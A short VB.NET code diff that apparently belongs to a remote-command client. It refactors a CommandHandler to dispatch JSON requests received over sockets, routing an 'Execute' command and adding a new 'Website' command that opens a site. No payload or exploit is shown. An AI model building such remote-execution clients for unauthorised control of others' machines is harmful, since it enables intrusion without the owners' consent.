@@ -3,7 +3,7 @@ Imports System.Net.Sockets
 Imports Newtonsoft.Json
 
 Namespace Alduin.Stump.Class.Commands
-    Public Class CommandHandler
+    Public Class CommandHandler : Implements ICommand
         Public Sub New()
 
         End Sub
@@ -12,8 +12,10 @@ Namespace Alduin.Stump.Class.Commands
             Select Case method
                 Case "Execute"
                     Dim ModelDes As ExecuteModel = JsonConvert.DeserializeAnonymousType(request, New ExecuteModel)
-                    Return Handler(ModelDes)
+                    Return ExecuteCommand.Handler(ModelDes)
                 Case "Website"
+                    Dim ModelDes As WebsiteOpenModel = JsonConvert.DeserializeAnonymousType(request, New WebsiteOpenModel)
+                    Return OpenWebsiteCommand.Handler(ModelDes)
             End Select
             Dim url As String = RequestSplitter(request)
             Select Case url
